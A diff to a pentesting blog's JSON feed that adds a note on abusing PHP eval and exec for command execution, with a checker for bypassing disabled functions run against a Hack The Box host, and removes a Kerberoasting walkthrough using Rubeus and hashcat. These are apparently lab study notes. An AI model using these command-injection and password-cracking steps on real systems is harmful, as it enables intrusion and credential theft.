@@ -17,6 +17,30 @@
 "items": [
     
         {
+            "id": "https://mvineza.github.io/spindel/2022/05/20/dangerous-functions",
+            "title": "Dangerous Functions",
+            "summary": "Dangerous Functions",
+            "content_text": "PHP EvalSample usage:eval('$x = (5-1);');echo($x); // outputs 4Malicuous usage:eval('echo exec(\\'whoami\\');')eval('echo exec(\\'ls -l /home/alice\\');')  How eval() in php can be dangerous in web application’s security? - Information Security Stack ExchangeOther PHP Functionsexecshell_execsystempassthrupopenUseful Configurations# pin you to a specific directoryopen_basedirCommands# checks what dangerous functions exposedpython2 ~/data/tools/dfunc-bypasser.py --url http://htb/utility-scripts/info.phpReferences  Dangerous php functions Bypassing disable_functions in PHP - Pentester Notes  Dangerous PHP Functions · GitHub",
+            "content_html": "<h2 id=\"php-eval\">PHP Eval</h2><p>Sample usage:</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'$x = (5-1);'</span><span class=\"p\">);</span><span class=\"k\">echo</span><span class=\"p\">(</span><span class=\"nv\">$x</span><span class=\"p\">);</span> <span class=\"c1\">// outputs 4</span></code></pre></div></div><p>Malicuous usage:</p><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'echo exec(\\'whoami\\');'</span><span class=\"p\">)</span><span class=\"k\">eval</span><span class=\"p\">(</span><span class=\"s1\">'echo exec(\\'ls -l /home/alice\\');'</span><span class=\"p\">)</span></code></pre></div></div><ul>  <li><a href=\"https://security.stackexchange.com/questions/179375/how-eval-in-php-can-be-dangerous-in-web-applications-security\">How eval() in php can be dangerous in web application’s security? - Information Security Stack Exchange</a></li></ul><h2 id=\"other-php-functions\">Other PHP Functions</h2><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>execshell_execsystempassthrupopen</code></pre></div></div><h2 id=\"useful-configurations\">Useful Configurations</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># pin you to a specific directory</span>open_basedir</code></pre></div></div><h2 id=\"commands\">Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># checks what dangerous functions exposed</span>python2 ~/data/tools/dfunc-bypasser.py <span class=\"nt\">--url</span> http://htb/utility-scripts/info.php</code></pre></div></div><h1 id=\"references\">References</h1><ul>  <li><a href=\"https://alionder.net/dangerous-php-functions/\">Dangerous php functions Bypassing disable_functions in PHP - Pentester Notes</a></li>  <li><a href=\"https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720\">Dangerous PHP Functions · GitHub</a></li></ul>",
+            "url": "https://mvineza.github.io/spindel/2022/05/20/dangerous-functions",
+            
+            
+            
+            
+            
+            "date_published": "2022-05-20T00:00:00+08:00",
+            "date_modified": "2022-05-20T00:00:00+08:00",
+            
+                "author":  {
+                "name": "spindel",
+                "url": null,
+                "avatar": null
+                }
+                
+            
+        },
+    
+        {
             "id": "https://mvineza.github.io/spindel/2022/05/19/nuxeo",
             "title": "Nuxeo",
             "summary": "Nuxeo",
@@ -846,30 +870,6 @@
             
             "date_published": "2022-03-10T00:00:00+08:00",
             "date_modified": "2022-03-10T00:00:00+08:00",
-            
-                "author":  {
-                "name": "spindel",
-                "url": null,
-                "avatar": null
-                }
-                
-            
-        },
-    
-        {
-            "id": "https://mvineza.github.io/spindel/2022/03/08/kerberoasting-rubeus",
-            "title": "Kerberoasting - Rubeus",
-            "summary": "Kerberoasting - Rubeus",
-            "content_text": "  Launch rubeus on victim’s machineRubeus.exe kerberoast  Wait for some hash to appear. Here is a truncated example.[*] SamAccountName         : SQLService[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111[*] PwdLastSet             : 5/25/2020 10:28:26 PM[*] Supported ETypes       : RC4_HMAC_DEFAULT[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local...  Convert the hash block into single line.cat hash_block | tr -d '\\n' &gt; hash_single_line  Get a modified rockyou here (or use the whole rockyou inside /usr/share/wordlists)curl -OL https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.tx  Crack using hashcat.hashcat -m 13100 -a 0 hash_single_line Pass.txt",
-            "content_html": "<ul>  <li>Launch rubeus on victim’s machine</li></ul><div class=\"language-batch highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"kd\">Rubeus</span><span class=\"err\">.exe</span> <span class=\"kd\">kerberoast</span></code></pre></div></div><ul>  <li>Wait for some hash to appear. Here is a truncated example.</li></ul><div class=\"language-batch highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"o\">[*]</span> <span class=\"kd\">SamAccountName</span>         : <span class=\"kd\">SQLService</span><span class=\"o\">[*]</span> <span class=\"kd\">DistinguishedName</span>      : <span class=\"kd\">CN</span><span class=\"o\">=</span><span class=\"kd\">SQLService</span><span class=\"o\">,</span><span class=\"kd\">CN</span><span class=\"o\">=</span><span class=\"kd\">Users</span><span class=\"o\">,</span><span class=\"kd\">DC</span><span class=\"o\">=</span><span class=\"kd\">CONTROLLER</span><span class=\"o\">,</span><span class=\"kd\">DC</span><span class=\"o\">=</span><span class=\"kd\">local</span><span class=\"o\">[*]</span> <span class=\"kd\">ServicePrincipalName</span>   : <span class=\"kd\">CONTROLLER</span><span class=\"o\">-</span><span class=\"m\">1</span><span class=\"na\">/SQLService</span>.CONTROLLER.local:30111<span class=\"o\">[*]</span> <span class=\"kd\">PwdLastSet</span>             : <span class=\"m\">5</span>/25/2020 <span class=\"m\">10</span>:28:26 <span class=\"kd\">PM</span><span class=\"o\">[*]</span> <span class=\"kd\">Supported</span> <span class=\"kd\">ETypes</span>       : <span class=\"kd\">RC4_HMAC_DEFAULT</span><span class=\"o\">[*]</span> <span class=\"kd\">Hash</span>                   : $krb5tgs$23$<span class=\"o\">*</span><span class=\"kd\">SQLService</span>$CONTROLLER.local$CONTROLLER<span class=\"o\">-</span><span class=\"m\">1</span><span class=\"na\">/SQLService</span>.CONTROLLER.local...</code></pre></div></div><ul>  <li>Convert the hash block into single line.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cat </span>hash_block | <span class=\"nb\">tr</span> <span class=\"nt\">-d</span> <span class=\"s1\">'\\n'</span> <span class=\"o\">&gt;</span> hash_single_line</code></pre></div></div><ul>  <li>Get a modified rockyou <a href=\"https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt\">here</a> (or use the whole rockyou inside <code class=\"language-plaintext highlighter-rouge\">/usr/share/wordlists</code>)</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>curl <span class=\"nt\">-OL</span> https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.tx</code></pre></div></div><ul>  <li>Crack using hashcat.</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>hashcat <span class=\"nt\">-m</span> 13100 <span class=\"nt\">-a</span> 0 hash_single_line Pass.txt</code></pre></div></div>",
-            "url": "https://mvineza.github.io/spindel/2022/03/08/kerberoasting-rubeus",
-            
-            
-            
-            "tags": ["windows","ad","kerberos"],
-            
-            "date_published": "2022-03-08T00:00:00+08:00",
-            "date_modified": "2022-03-08T00:00:00+08:00",
             
                 "author":  {
                 "name": "spindel",
